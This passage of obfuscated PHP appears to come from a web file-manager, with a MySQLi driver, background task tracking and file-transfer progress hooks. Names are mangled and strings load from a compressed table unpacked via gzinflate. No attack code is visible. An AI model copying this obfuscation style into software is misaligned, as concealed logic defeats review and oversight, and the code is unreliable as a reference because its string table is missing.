$Ï½‘Ûí =& $_SERVER[ŒÅŸ‹ä†]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Ñ¸¸“Ğ; if ($this->queryID) { $this->free(); } think_action_status($Ï½‘Ûí[35], 1); think_status($Ï½‘Ûí[34]); $½¬âÚäŞ = $this->_linkID->query($Ñ¸¸“Ğ); $this->debug(); if (!1 === $½¬âÚäŞ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Éª„¨™ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$Éª„¨™) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $…¤ÆÃ©» = $this->_linkID->rollback(); $this->transTimes = 0; if (!$…¤ÆÃ©») { $this->error(); return !1; } } return !0; } private function getAll() { $´ï­ô¸× = array(); if ($this->numRows > 0) { for ($ŠÔÑÏ¯ = 0; $ŠÔÑÏ¯ < $this->numRows; $ŠÔÑÏ¯++) { $´ï­ô¸×[$ŠÔÑÏ¯] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $´ï­ô¸×; } public function getFields($ŸÇ„Ï ú) { $âõ¢Ê­ş =& $_SERVER[ŒÅŸ‹ä†]; $¶ˆ„ú¢ô = $this->query($âõ¢Ê­ş[1005] . $this->parseKey($ŸÇ„Ï ú)); $„îÃ®À‚ = array(); if ($¶ˆ„ú¢ô) { foreach ($¶ˆ„ú¢ô as $µ‹İµ´­ => $¸¶²ÍÙ†) { $„îÃ®À‚[$¸¶²ÍÙ†[$âõ¢Ê­ş[41]]] = array($âõ¢Ê­ş[42] => $¸¶²ÍÙ†[$âõ¢Ê­ş[41]], $âõ¢Ê­ş[43] => $¸¶²ÍÙ†[$âõ¢Ê­ş[44]], $âõ¢Ê­ş[45] => (bool) ($¸¶²ÍÙ†[$âõ¢Ê­ş[46]] === $âõ¢Ê­ş[12]), $âõ¢Ê­ş[47] => $¸¶²ÍÙ†[$âõ¢Ê­ş[48]], $âõ¢Ê­ş[49] => strtolower($¸¶²ÍÙ†[$âõ¢Ê­ş[50]]) == $âõ¢Ê­ş[51], $âõ¢Ê­ş[52] => strtolower($¸¶²ÍÙ†[$âõ¢Ê­ş[53]]) == $âõ¢Ê­ş[54]); } } return $„îÃ®À‚; } public function getTables($ú®Ñ©™ = '') { $»éáñ =& $_SERVER[ŒÅŸ‹ä†]; $§Å¹ïä” = !empty($ú®Ñ©™) ? $»éáñ[1007] . $ú®Ñ©™ . $»éáñ[1008] : $»éáñ[1009]; $„µÃ… = $this->query($§Å¹ïä”); $ÁÏÉÂ–Š = array(); if ($„µÃ…) { foreach ($„µÃ… as $é±ğ†¿ => $½ö›ç†) { $ÁÏÉÂ–Š[$é±ğ†¿] = current($½ö›ç†); } } return $ÁÏÉÂ–Š; } public function replace($“ûóÍÓé, $±ùŠ·ß¯ = array()) { $É½å‰² =& $_SERVER[ŒÅŸ‹ä†]; foreach ($“ûóÍÓé as $ˆëÆÍ => $Í¸ÕƒŸ²) { $¬Ò÷’†Ç = $this->parseValue($Í¸ÕƒŸ²); if (is_scalar($¬Ò÷’†Ç)) { $ªø™×Ã[] = $¬Ò÷’†Ç; $ßâ´¥æ‘[] = $this->parseKey($ˆëÆÍ); } } $“ºš»“¨ = $É½å‰²[1010] . $this->parseTable($±ùŠ·ß¯[$É½å‰²[367]]) . $É½å‰²[1011] . implode($É½å‰²[60], $ßâ´¥æ‘) . $É½å‰²[1012] . implode($É½å‰²[60], $ªø™×Ã) . $É½å‰²[1013]; return $this->execute($“ºš»“¨); } public function insertAll($µ¤¾å›¥, $ÀÉ³İ³ = array(), $êÅ¹Ï‘œ = false) { $ãõÓ­ç  =& $_SERVER[ŒÅŸ‹ä†]; if (!is_array($µ¤¾å›¥[0])) { return !1; } $Ø†Œœó¥ = array_keys($µ¤¾å›¥[0]); $ìãü•ß = array(); foreach ($µ¤¾å›¥ as $¦•¡Æ…Ğ) { $š³Çœ©— = array(); foreach ($¦•¡Æ…Ğ as $áãœ‘ÙŸ => $Ğ¯Å§šŒ) { $Ğ¯Å§šŒ = $this->parseValue($Ğ¯Å§šŒ); if (is_scalar($Ğ¯Å§šŒ)) { $š³Çœ©—[] = $Ğ¯Å§šŒ; } } $ìãü•ß[] = $ãõÓ­ç [347] . implode($ãõÓ­ç [60], $š³Çœ©—) . $ãõÓ­ç [1013]; } array_walk($Ø†Œœó¥, array($this, $ãõÓ­ç [1014])); $„ƒ°Ÿ•İ = $êÅ¹Ï‘œ ? $ãõÓ­ç [1015] : $ãõÓ­ç [1016]; $„ƒ°Ÿ•İ = $ãõÓ­ç [1016]; $¢²‚ÉçÔ = $„ƒ°Ÿ•İ . $ãõÓ­ç [1017] . $this->parseTable($ÀÉ³İ³[$ãõÓ­ç [367]]) . $ãõÓ­ç [1011] . implode($ãõÓ­ç [60], $Ø†Œœó¥) . $ãõÓ­ç [1018] . implode($ãõÓ­ç [60], $ìãü•ß); if ($êÅ¹Ï‘œ) { $Â€îĞ”Ê = array(); foreach ($Ø†Œœó¥ as $áãœ‘ÙŸ) { if ($áãœ‘ÙŸ == $ãõÓ­ç [242] || $áãœ‘ÙŸ == $ãõÓ­ç [1019]) { continue; } $Â€îĞ”Ê[] = $áãœ‘ÙŸ . $ãõÓ­ç [1020] . $áãœ‘ÙŸ . $ãõÓ­ç [1013]; } $¢²‚ÉçÔ .= $ãõÓ­ç [1021] . implode($ãõÓ­ç [60], $Â€îĞ”Ê); } return $this->execute($¢²‚ÉçÔ); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $¶õŸê¢ =& $_SERVER[ŒÅŸ‹ä†]; $this->error = $this->_linkID->errno . $¶õŸê¢[4] . $this->_linkID->error; if ($¶õŸê¢[12] != $this->queryStr) { $this->error .= LNG($¶õŸê¢[58]) . $this->queryStr; } think_trace($this->error, $¶õŸê¢[12], $¶õŸê¢[59]); return $this->error; } public function escapeString($°¨îÕ‡) { if ($this->_linkID) { return $this->_linkID->real_escape_string($°¨îÕ‡); } else { return addslashes($°¨îÕ‡); } } public function parseKey(&$œ®˜âˆ, $®ˆü‡Åï = true) { $½ãíóŸŸ =& $_SERVER[ŒÅŸ‹ä†]; if ($®ˆü‡Åï) { $œ®˜âˆ = $this->parseKeyCheck($œ®˜âˆ); } if ($œ®˜âˆ != $½ãíóŸŸ[231] && !preg_match($½ãíóŸŸ[1022], $œ®˜âˆ)) { $œ®˜âˆ = $½ãíóŸŸ[481] . trim($œ®˜âˆ, $½ãíóŸŸ[481]) . $½ãíóŸŸ[481]; } return $œ®˜âˆ; } } goto DÀŒÎä–Ÿñ; cºÍ‹Ò™µä: $cbngaqwyls = $_SERVER[ŒÅŸ‹ä†][707]; if (!$cbngaqwyls) { return; } $_SERVER[‹«õ‘¢ğ] = explode($_SERVER[ŒÅŸ‹ä†][708], gzinflate(substr($_SERVER[ŒÅŸ‹ä†][709], 10, -8))); goto CÚÙõ¤‰ô; CÓ³çºÌñà: class Task { const STATYS_STOP = "\163\164\x6f\160"; const STATYS_RUNNING = "\162\x75\x6e\156\x69\x6e\x67"; const STATYS_KILL = "\153\x69\x6c\154"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($¹ĞÏÂÀ°, $éåê = '', $™­è°›‡ = 0, $¤‡“ÚŞ¬ = '') { $’ç£üı =& $_SERVER[ŒÅŸ‹ä†]; if (self::get($¹ĞÏÂÀ°)) { return; } $this->task = array($’ç£üı[492] => $¹ĞÏÂÀ°, $’ç£üı[1537] => USER_ID, $’ç£üı[1808] => $¤‡“ÚŞ¬, $’ç£üı[545] => $’ç£üı[12], $’ç£üı[43] => $éåê, $’ç£üı[1175] => $’ç£üı[12], $’ç£üı[1173] => $™­è°›‡, $’ç£üı[1920] => 0, $’ç£üı[1921] => 0, $’ç£üı[1922] => 0, $’ç£üı[1923] => timeFloat(), $’ç£üı[1924] => 0, $’ç£üı[1925] => 0, $’ç£üı[1926] => 0, $’ç£üı[1927] => 0, $’ç£üı[846] => $’ç£üı[1870]); $GLOBALS[$’ç£üı[1928]] = 1; Hook::bind($’ç£üı[1874], array($this, $’ç£üı[1929])); Hook::bind($’ç£üı[1930], array($this, $’ç£üı[1931])); $this->startAfter(); Hook::trigger($’ç£üı[1932], $this->task); $this->task[$’ç£üı[1925]] = timeFloat(); } public function end($åôñÏ = '') { $¾ø·õ— =& $_SERVER[ŒÅŸ‹ä†]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$¾ø·õ—[1925]]) { self::valueSet($this->task[$¾ø·õ—[492]], !1); } $this->isEnd = !0; if ($åôñÏ) { $this->task[$¾ø·õ—[545]] = $åôñÏ; } self::log($¾ø·õ—[1933] . $this->task[$¾ø·õ—[492]] . $¾ø·õ—[1934] . sprintf($¾ø·õ—[959], timeFloat() - $this->task[$¾ø·õ—[1923]]) . $¾ø·õ—[1935]); Hook::unbind($¾ø·õ—[1874], array($this, $¾ø·õ—[1929])); Hook::unbind($¾ø·õ—[1930], array($this, $¾ø·õ—[1931])); $this->endAfter(); $ŒÏ‚Šãó = $this->task; $this->task = !1; Hook::trigger($¾ø·õ—[1936], $ŒÏ‚Šãó); } public function update($Ñ¤—„¬ = 0, $³Ã¦Ù…¾ = false) { $Àš¡È„õ =& $_SERVER[ŒÅŸ‹ä†]; $ê‰Ûâñ =& $this->task; if (!$ê‰Ûâñ) { return; } $ê‰Ûâñ[$Àš¡È„õ[1920]] += $Ñ¤—„¬; $ê‰Ûâñ[$Àš¡È„õ[1924]] = timeFloat(); if ($ê‰Ûâñ[$Àš¡È„õ[1173]]) { if ($ê‰Ûâñ[$Àš¡È„õ[1173]] < $ê‰Ûâñ[$Àš¡È„õ[1920]]) { $ê‰Ûâñ[$Àš¡È„õ[1173]] = $ê‰Ûâñ[$Àš¡È„õ[1920]]; } $ÔÔÂ‘„ = timeFloat() - $ê‰Ûâñ[$Àš¡È„õ[1923]] - $ê‰Ûâñ[$Àš¡È„õ[1926]]; if ($ÔÔÂ‘„ <= 0) { $ÔÔÂ‘„ = 0.001; } $ê‰Ûâñ[$Àš¡È„õ[1921]] = $ê‰Ûâñ[$Àš¡È„õ[1920]] / $ê‰Ûâñ[$Àš¡È„õ[1173]]; $ê‰Ûâñ[$Àš¡È„õ[1922]] = $ê‰Ûâñ[$Àš¡È„õ[1920]] / $ÔÔÂ‘„; if ($ê‰Ûâñ[$Àš¡È„õ[1921]] > 0) { $ê‰Ûâñ[$Àš¡È„õ[1927]] = $ÔÔÂ‘„ * (1 - $ê‰Ûâñ[$Àš¡È„õ[1921]]) / $ê‰Ûâñ[$Àš¡È„õ[1921]]; } $ê‰Ûâñ[$Àš¡È„õ[1927]] = $ê‰Ûâñ[$Àš¡È„õ[1927]] <= 0 ? 0 : $ê‰Ûâñ[$Àš¡È„õ[1927]]; } $this->updateAfter(); $‰Ü»— = 0.2; if (timeFloat() - $ê‰Ûâñ[$Àš¡È„õ[1925]] < $‰Ü»— && !$³Ã¦Ù…¾) { return; } $ÁÜŸ© = self::get($ê‰Ûâñ[$Àš¡È„õ[492]]); $Ûßï¤äÏ = $ÁÜŸ©[$Àš¡È„õ[846]]; if ($Ûßï¤äÏ == self::STATYS_KILL) { $–ÏÅßœ = array($Àš¡È„õ[1937] => LNG($Àš¡È„õ[1938]), $Àš¡È„õ[1344] => !1); Cache::set($Àš¡È„õ[1939] . $this->task[$Àš¡È„õ[492]], $–ÏÅßœ, 30); $this->onKill(); $this->end(); die; } else { if ($Ûßï¤äÏ == self::STATYS_STOP) { $øŞèì¦ƒ = 2; $ÁÜŸ©[$Àš¡È„õ[1926]] += $øŞèì¦ƒ; self::valueSet($ê‰Ûâñ[$Àš¡È„õ[492]], $ÁÜŸ©); sleep($øŞèì¦ƒ); $this->update(); return; } } $ê‰Ûâñ[$Àš¡È„õ[846]] = $Ûßï¤äÏ ? $Ûßï¤äÏ : $ê‰Ûâñ[$Àš¡È„õ[846]]; $ê‰Ûâñ[$Àš¡È„õ[1926]] = $ÁÜŸ©[$Àš¡È„õ[1926]] ? $ÁÜŸ©[$Àš¡È„õ[1926]] : 0; $ê‰Ûâñ[$Àš¡È„õ[1925]] = timeFloat(); Hook::trigger($Àš¡È„õ[1940], $ê‰Ûâñ); self::valueSet($ê‰Ûâñ[$Àš¡È„õ[492]], $ê‰Ûâñ); } public function onKillSet($¥¹Šˆ‹ş, $´Ààş¢œ = array()) { $this->onKillCall = array($¥¹Šˆ‹ş, $´Ààş¢œ); } public function onKill() { $ âˆù» =& $_SERVER[ŒÅŸ‹ä†]; self::log($ âˆù»[1933] . $this->task[$ âˆù»[492]] . $ âˆù»[1941]); Hook::trigger($ âˆù»[1942], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($Ôºô²¯Ù) { $ÈÓ¦Îúç =& $_SERVER[ŒÅŸ‹ä†]; Cache::set($ÈÓ¦Îúç[1939] . $this->task[$ÈÓ¦Îúç[492]], $Ôºô²¯Ù, 60); if (!is_array($Ôºô²¯Ù) || !$Ôºô²¯Ù[$ÈÓ¦Îúç[1344]]) { self::log($ÈÓ¦Îúç[1943] . json_encode($Ôºô²¯Ù)); } return $Ôºô²¯Ù; } public static function get($î¼©ï€ã) { $ä˜öÛø¿ =& $_SERVER[ŒÅŸ‹ä†]; $ş–éÔ­´ = self::valueGet($î¼©ï€ã); if (is_array($ş–éÔ­´) && $ş–éÔ­´[$ä˜öÛø¿[1944]]) { $¡ÈÅË¡ = ActionApply($ş–éÔ­´[$ä˜öÛø¿[1944]], array($ş–éÔ­´)); $ş–éÔ­´ = is_array($¡ÈÅË¡) ? $¡ÈÅË¡ : $ş–éÔ­´; } return $ş–éÔ­´; } public static function listData() { $¶Æ¿ıùµ = self::valueGet(); return array_sort_by($¶Æ¿ıùµ, $_SERVER[ŒÅŸ‹ä†][1923], !0); } public static function kill($à¢«ŠÉ) { return self::changeStatus($à¢«ŠÉ, self::STATYS_KILL); } public static function stop($Â‰ïŠ‰«) { return self::changeStatus($Â‰ïŠ‰«, self::STATYS_STOP); } public static function restart($¾Şßªë—) { return self::changeStatus($¾Şßªë—, self::STATYS_RUNNING); } public static function killAll() { $‡Ñİ×áû =& $_SERVER[ŒÅŸ‹ä†]; $ù†â†íà = self::listData(); foreach ($ù†â†íà as $ø„ÎèÉÈ) { self::kill($ø„ÎèÉÈ[$‡Ñİ×áû[492]]); } sleep(2); foreach ($ù†â†íà as $ø„ÎèÉÈ) { self::valueSet($ø„ÎèÉÈ[$‡Ñİ×áû[492]], !1); } } private static function changeStatus($»ä¥¨™³, $¬¶ü…ˆ) { $Æ¡ùß‚á =& $_SERVER[ŒÅŸ‹ä†]; $¤ºÁú« = self::valueGet($»ä¥¨™³); if (!$¤ºÁú«) { return !1; } $¤ºÁú«[$Æ¡ùß‚á[846]] = $¬¶ü…ˆ; self::valueSet($»ä¥¨™³, $¤ºÁú«); self::log($Æ¡ùß‚á[1945] . $¤ºÁú«[$Æ¡ùß‚á[492]] . $Æ¡ùß‚á[1946] . $¬¶ü…ˆ); return !0; } public static function valueGet($ç÷àüŒÄ = false) { $üŸıÃ±‹ =& $_SERVER[ŒÅŸ‹ä†]; if ($ç÷àüŒÄ) { $®÷è™–î = Model($üŸıÃ±‹[539])->where(array($üŸıÃ±‹[105] => $ç÷àüŒÄ, $üŸıÃ±‹[43] => $üŸıÃ±‹[1182]))->find(); return $®÷è™–î ? json_decode($®÷è™–î[$üŸıÃ±‹[460]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($·¯¤—åÂ = false) { $”èÌØ¬ =& $_SERVER[ŒÅŸ‹ä†]; $úƒ€©ÃÀ = array($”èÌØ¬[43] => $”èÌØ¬[1182]); if ($·¯¤—åÂ) { $úƒ€©ÃÀ[$”èÌØ¬[1537]] = $·¯¤—åÂ; } $·œü÷È = Model($”èÌØ¬[539])->where($úƒ€©ÃÀ)->select(); $·œü÷È = $·œü÷È ? $·œü÷È : array(); foreach ($·œü÷È as $ĞÚ… ¹ç => $—½¨ÙË) { $·œü÷È[$ĞÚ… ¹ç] = json_decode($—½¨ÙË[$”èÌØ¬[460]], !0); } return $·œü÷È; } public static function valueSet($ŞÛÆí±», $ï’¦øá¿) { $Èåë§Š§ =& $_SERVER[ŒÅŸ‹ä†]; if (!$ï’¦øá¿) { return Model($Èåë§Š§[539])->where(array($Èåë§Š§[105] => $ŞÛÆí±», $Èåë§Š§[43] => $Èåë§Š§[1182]))->delete(); } $›»¤‹¦ = json_encode($ï’¦øá¿); if (!$›»¤‹¦) { ob_start(); var_dump($ï’¦øá¿); $Æº°ØÛŒ = ob_get_clean(); self::log($Èåë§Š§[1947] . json_encode_force($Æº°ØÛŒ)); } if (!$ŞÛÆí±» || !$ï’¦øá¿[$Èåë§Š§[492]]) { return !1; } $‘İï¨¹¬ = array($Èåë§Š§[43] => $Èåë§Š§[1182], $Èåë§Š§[1537] => USER_ID, $Èåë§Š§[105] => $ŞÛÆí±», $Èåë§Š§[460] => $›»¤‹¦); $ÄàÔ½À = $Èåë§Š§[1948]; CacheLock::lock($ÄàÔ½À); Model($Èåë§Š§[539])->add($‘İï¨¹¬, array(), !0); CacheLock::unlock($ÄàÔ½À); } public static function log($ôà¼ÓÄ€) { if (!GLOBAL_DEBUG) { return; } write_log($ôà¼ÓÄ€, $_SERVER[ŒÅŸ‹ä†][1949]); } } class TaskFileTransfer extends Task { protected function startAfter() { $¼»Ø³¿ì =& $_SERVER[ŒÅŸ‹ä†]; $ä©Ä´¢ =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($¼»Ø³¿ì[1950], array($this, $¼»Ø³¿ì[1951])); Hook::bind($¼»Ø³¿ì[1355], array($this, $¼»Ø³¿ì[1952])); Hook::bind($¼»Ø³¿ì[1953], array($this, $¼»Ø³¿ì[1954])); Hook::bind($¼»Ø³¿ì[696], array($this, $¼»Ø³¿ì[1955])); Hook::bind($¼»Ø³¿ì[697], array($this, $¼»Ø³¿ì[1956])); Hook::bind($¼»Ø³¿ì[703], array($this, $¼»Ø³¿ì[1957])); Hook::bind($¼»Ø³¿ì[704], array($this, $¼»Ø³¿ì[1958])); Hook::bind($¼»Ø³¿ì[699], array($this, $¼»Ø³¿ì[1959])); Hook::bind($¼»Ø³¿ì[701], array($this, $¼»Ø³¿ì[1960])); Hook::bind($¼»Ø³¿ì[665], array($this, $¼»Ø³¿ì[1961])); Hook::bind($¼»Ø³¿ì[662], array($this, $¼»Ø³¿ì[1961])); Hook::bind($¼»Ø³¿ì[667], array($this, $¼»Ø³¿ì[1961])); Hook::bind($¼»Ø³¿ì[669], array($this, $¼»Ø³¿ì[1961])); Hook::bind($¼»Ø³¿ì[671], array($this, $¼»Ø³¿ì[1961])); Hook::bind($¼»Ø³¿ì[1962], array($this, $¼»Ø³¿ì[1963])); Hook::bind($¼»Ø³¿ì[687], array($this, $¼»Ø³¿ì[1964])); $this->sourceModelCopyFlag = !1; Hook::bind($¼»Ø³¿ì[1965], array($this, $¼»Ø³¿ì[1966])); Hook::bind($¼»Ø³¿ì[1967], array($this, $¼»Ø³¿ì[1968])); Hook::bind($¼»Ø³¿ì[1969], array($this, $¼»Ø³¿ì[1970])); $ä©Ä´¢[$¼»Ø³¿ì[1971]] = LNG($¼»Ø³¿ì[1972]); $ä©Ä´¢[$¼»Ø³¿ì[1973]] = 0; $ä©Ä´¢[$¼»Ø³¿ì[1974]] = 0; $ä©Ä´¢[$¼»Ø³¿ì[1175]] = $¼»Ø³¿ì[12]; $ä©Ä´¢[$¼»Ø³¿ì[1975]] = $¼»Ø³¿ì[12]; $ä©Ä´¢[$¼»Ø³¿ì[1976]] = 0; $ä©Ä´¢[$¼»Ø³¿ì[1977]] = 0; $ä©Ä´¢[$¼»Ø³¿ì[1978]] = 0; if (!$ä©Ä´¢[$¼»Ø³¿ì[1808]]) { $ä©Ä´¢[$¼»Ø³¿ì[1808]] = LNG($¼»Ø³¿ì[1979]); } } protected function endAfter() { $ÕØÂèİÇ =& $_SERVER[ŒÅŸ‹ä†]; Hook::unbind($ÕØÂèİÇ[1950], array($this, $ÕØÂèİÇ[1951])); Hook::unbind($ÕØÂèİÇ[1355], array($this, $ÕØÂèİÇ[1952])); Hook::unbind($ÕØÂèİÇ[1953], array($this, $ÕØÂèİÇ[1954])); Hook::unbind($ÕØÂèİÇ[696], array($this, $ÕØÂèİÇ[1955])); Hook::unbind($ÕØÂèİÇ[697], array($this, $ÕØÂèİÇ[1956])); Hook::unbind($ÕØÂèİÇ[703], array($this, $ÕØÂèİÇ[1957])); Hook::unbind($ÕØÂèİÇ[704], array($this, $ÕØÂèİÇ[1958])); Hook::unbind($ÕØÂèİÇ[699], array($this, $ÕØÂèİÇ[1959])); Hook::unbind($ÕØÂèİÇ[701], array($this, $ÕØÂèİÇ[1960])); Hook::unbind($ÕØÂèİÇ[665], array($this, $ÕØÂèİÇ[1961])); Hook::unbind($ÕØÂèİÇ[662], array($this, $ÕØÂèİÇ[1961])); Hook::unbind($ÕØÂèİÇ[667], array($this, $ÕØÂèİÇ[1961])); Hook::unbind($ÕØÂèİÇ[669], array($this, $ÕØÂèİÇ[1961])); Hook::unbind($ÕØÂèİÇ[671], array($this, $ÕØÂèİÇ[1961])); Hook::unbind($ÕØÂèİÇ[1962], array($this, $ÕØÂèİÇ[1963])); Hook::unbind($ÕØÂèİÇ[687], array($this, $ÕØÂèİÇ[1964])); Hook::unbind($ÕØÂèİÇ[1965], array($this, $ÕØÂèİÇ[1966])); Hook::unbind($ÕØÂèİÇ[1967], array($this, $ÕØÂèİÇ[1968])); Hook::unbind($ÕØÂèİÇ[1969], array($this, $ÕØÂèİÇ[1970])); } public function copyMoveStart($êÈ™Ø€, $‡÷­ ö¶, $®¡—¹Ïè, $ö±“Â†§) { $ü¦˜Ÿ =& $_SERVER[ŒÅŸ‹ä†]; self::log($ü¦˜Ÿ[1980] . $‡÷­ ö¶ . $ü¦˜Ÿ[83] . $ö±“Â†§); $Òü©±² = rtrim(TEMP_FILES, $ü¦˜Ÿ[8]); if (substr($‡÷­ ö¶, 0, strlen($Òü©±²)) == $Òü©±²) { return; } if (substr($ö±“Â†§, 0, strlen($Òü©±²)) == $Òü©±²) { return; } $îİÔªÂ =& $this->task; $îİÔªÂ[$ü¦˜Ÿ[1981]] = KodIO::transferType($êÈ™Ø€, $®¡—¹Ïè); self::log($ü¦˜Ÿ[1982] . $îİÔªÂ[$ü¦˜Ÿ[1981]] . $ü¦˜Ÿ[84] . $‡÷­ ö¶ . $ü¦˜Ÿ[83] . $ö±“Â†§); $this->update(); } public function updateAfter() { $Ë¡ËÙ±Œ =& $_SERVER[ŒÅŸ‹ä†]; $¸®Ëß¿» =& $this->task; if (!$¸®Ëß¿»[$Ë¡ËÙ±Œ[860]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($¸®Ëß¿»[$Ë¡ËÙ±Œ[1981]] == $Ë¡ËÙ±Œ[1458]) { return; } self::updateTask($¸®Ëß¿»); } private static function updateTask(&$—ÁËŸÊû) { $ç¤‰€éü =& $_SERVER[ŒÅŸ‹ä†]; if ($—ÁËŸÊû[$ç¤‰€éü[1981]] == $ç¤‰€éü[1326] || $—ÁËŸÊû[$ç¤‰€éü[1981]] == $ç¤‰€éü[118]) { if ($—ÁËŸÊû[$ç¤‰€éü[1975]]) { $—ÁËŸÊû[$ç¤‰€éü[1978]] = $—ÁËŸÊû[$ç¤‰€éü[1977]] + $—ÁËŸÊû[$ç¤‰€éü[1974]]; } } else { if ($—ÁËŸÊû[$ç¤‰€éü[1981]] == $ç¤‰€éü[1459]) { if ($—ÁËŸÊû[$ç¤‰€éü[1975]] == $ç¤‰€éü[1326]) { $—ÁËŸÊû[$ç¤‰€éü[1978]] = $—ÁËŸÊû[$ç¤‰€éü[1977]] + $—ÁËŸÊû[$ç¤‰€éü[1974]] * 0.5; } else { if ($—ÁËŸÊû[$ç¤‰€éü[1975]] == $ç¤‰€éü[118]) { $—ÁËŸÊû[$ç¤‰€éü[1978]] = $—ÁËŸÊû[$ç¤‰€éü[1977]] + $—ÁËŸÊû[$ç¤‰€éü[1973]] * 0.5 + $—ÁËŸÊû[$ç¤‰€éü[1974]] * 0.5; } } } } $—ÁËŸÊû[$ç¤‰€éü[1921]] = $—ÁËŸÊû[$ç¤‰€éü[1978]] / $—ÁËŸÊû[$ç¤‰€éü[860]]; if ($—ÁËŸÊû[$ç¤‰€éü[1921]] > 0) { $ï‰ÜÁ• = timeFloat() - $—ÁËŸÊû[$ç¤‰€éü[1923]] - $—ÁËŸÊû[$ç¤‰€éü[1926]]; $—ÁËŸÊû[$ç¤‰€éü[1927]] = $ï‰ÜÁ• * (1 - $—ÁËŸÊû[$ç¤‰€éü[1921]]) / $—ÁËŸÊû[$ç¤‰€éü[1921]]; } $‡•–ÚÙ¥ = $—ÁËŸÊû[$ç¤‰€éü[1974]] . $ç¤‰€éü[943] . $—ÁËŸÊû[$ç¤‰€éü[1973]] . "\x3b\x20{$°ÁÑãäü}\73" . $—ÁËŸÊû[$ç¤‰€éü[1978]]; self::log($ç¤‰€éü[1983] . $—ÁËŸÊû[$ç¤‰€éü[1975]] . $ç¤‰€éü[84] . $—ÁËŸÊû[$ç¤‰€éü[1921]] . $ç¤‰€éü[84] . $‡•–ÚÙ¥); } public function addPath($È’‰”Ş£) { $æİóÏ =& $_SERVER[ŒÅŸ‹ä†]; if (!$È’‰”Ş£) { return; } $Ü†Ş¦¶Ğ =& $this->task; $±ÎáÖõ“ = IO::infoWithChildren($È’‰”Ş£); $‡±‚¥ØÚ = $Ü†Ş¦¶Ğ[$æİóÏ[1984]] ? $Ü†Ş¦¶Ğ[$æİóÏ[1984]][$æİóÏ[1985]] : 0; $Ü†Ş¦¶Ğ[$æİóÏ[1984]] = array($æİóÏ[1985] => $‡±‚¥ØÚ + 1, $æİóÏ[514] => $±ÎáÖõ“[$æİóÏ[42]], $æİóÏ[97] => $±ÎáÖõ“[$æİóÏ[97]], $æİóÏ[607] => $±ÎáÖõ“[$æİóÏ[607]] ? $±ÎáÖõ“[$æİóÏ[607]] : $±ÎáÖõ“[$æİóÏ[97]]); if ($±ÎáÖõ“[$æİóÏ[43]] == $æİóÏ[241]) { $Ü†Ş¦¶Ğ[$æİóÏ[1173]] += 1; } else { $Ü†Ş¦¶Ğ[$æİóÏ[1173]] += $±ÎáÖõ“[$æİóÏ[92]][$æİóÏ[90]]; if ($±ÎáÖõ“[$æİóÏ[202]]) { $Ü†Ş¦¶Ğ[$æİóÏ[1173]] += $±ÎáÖõ“[$æİóÏ[92]][$æİóÏ[91]] + 1; } } $Ü†Ş¦¶Ğ[$æİóÏ[860]] += $±ÎáÖõ“[$æİóÏ[89]]; $this->update(); self::log(array($æİóÏ[1986] . $È’‰”Ş£, $±ÎáÖõ“)); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($™¨Ÿİ¨) { } public function sourceAddHashEnd($ı”¾®¼’) { } public function sourceAddFileStart($Í½úãµÁ) { $ÒŒµ­ùò =& $_SERVER[ŒÅŸ‹ä†]; $ÀÀ™Ã€Ğ =& $this->task; $ÀÀ™Ã€Ğ[$ÒŒµ­ùò[1973]] = $Í½úãµÁ[$ÒŒµ­ùò[89]]; $ÀÀ™Ã€Ğ[$ÒŒµ­ùò[1971]] = $Í½úãµÁ[$ÒŒµ­ùò[42]]; $ÀÀ™Ã€Ğ[$ÒŒµ­ùò[1175]] = $Í½úãµÁ[$ÒŒµ­ùò[42]]; $ÀÀ™Ã€Ğ[$ÒŒµ­ùò[1987]] = $Í½úãµÁ[$ÒŒµ­ùò[97]]; $this->update(); self::log($ÒŒµ­ùò[1988] . $Í½úãµÁ[$ÒŒµ­ùò[97]] . $ÒŒµ­ùò[1989] . $Í½úãµÁ[$ÒŒµ­ùò[89]]); } public function sourceAddFileEnd($¸íŒ¿Çó) { $„úˆˆŠµ =& $_SERVER[ŒÅŸ‹ä†]; $ÕŞä¿¦ =& $this->task; $ÕŞä¿¦[$„úˆˆŠµ[1978]] += $¸íŒ¿Çó[$„úˆˆŠµ[89]]; $ÕŞä¿¦[$„úˆˆŠµ[1987]] = $¸íŒ¿Çó[$„úˆˆŠµ[97]]; $this->update(1); self::log($„úˆˆŠµ[1990] . $¸íŒ¿Çó[$„úˆˆŠµ[97]] . $„úˆˆŠµ[1989] . $¸íŒ¿Çó[$„úˆˆŠµ[89]] . $„úˆˆŠµ[1991]); } public function copyFileStart($ĞÜåİí’, $óòí»‚º, $şÉêÈ¤˜, $Ó¶í¼µ, $òİ×ÆÕ­, $×«ë–Ş) { $³†ì×½’ =& $_SERVER[ŒÅŸ‹ä†]; $Õ”À‰å = $òİ×ÆÕ­; if ($Õ”À‰å == $GLOBALS[$³†ì×½’[1992]]) { $Õ”À‰å = $GLOBALS[$³†ì×½’[1993]]; } $GLOBALS[$³†ì×½’[1993]] = $òİ×ÆÕ­; $GLOBALS[$³†ì×½’[1992]] = $×«ë–Ş; $¯úàÂëÈ =& $this->task; $¯úàÂëÈ[$³†ì×½’[1971]] = $Õ”À‰å; $¯úàÂëÈ[$³†ì×½’[1973]] = (int) $ĞÜåİí’->size($óòí»‚º); 